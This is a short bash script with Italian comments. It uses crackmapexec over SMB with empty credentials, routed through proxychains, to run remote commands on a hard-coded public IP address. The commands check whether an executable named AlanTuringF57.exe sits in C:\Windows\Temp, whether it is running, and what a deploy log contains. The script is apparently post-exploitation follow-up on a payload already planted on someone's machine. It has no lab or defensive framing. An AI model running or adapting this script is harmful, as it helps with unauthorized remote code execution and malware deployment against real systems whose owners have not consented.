TARGET="186.57.237.126"
FILENAME="AlanTuringF57.exe"  # Il tuo nome esatto!

echo "🔍 VERIFY PRIMO COMANDO (già installato?)"

# 1. FILE ESISTE?
proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method cmdexec -x "
powershell -c \"if(Test-Path 'C:\\Windows\\Temp\\$FILENAME'){ '✅ FILE OK!' }else{ '❌ NO FILE' }\"
"

# 2. PROCESSO VIVO?
proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method cmdexec -x "
tasklist | findstr $FILENAME
"

# 3. LOG DEPLOY?
proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method cmdexec -x "
type C:\\Windows\\Temp\\deploy.log
"

# 4. STATO COMPLETO
proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method cmdexec -x "
powershell -c \"Get-Process | ?{\$_.ProcessName -like '*AlanTuring*'}; dir C:\\Windows\\Temp\\$FILENAME\"
"
